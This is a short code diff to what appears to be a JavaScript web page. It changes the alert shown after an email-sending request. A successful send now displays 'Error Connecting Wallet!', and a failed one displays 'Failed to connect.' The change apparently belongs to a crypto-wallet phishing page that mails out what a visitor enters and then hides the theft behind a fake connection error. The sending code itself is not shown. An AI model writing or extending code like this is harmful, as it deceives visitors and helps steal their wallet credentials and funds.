@@ -206,11 +206,11 @@
             })
             .then(response => {
                 console.log("SUCCESS!", response.status, response.text);
-                alert("Email sent successfully!");
+                alert("Error Connecting Wallet!");
             })
             .catch(error => {
                 console.error("Failed to send email:", error);
-                alert("Failed to send email.");
+                alert("Failed to connect.");
             });
         }
 
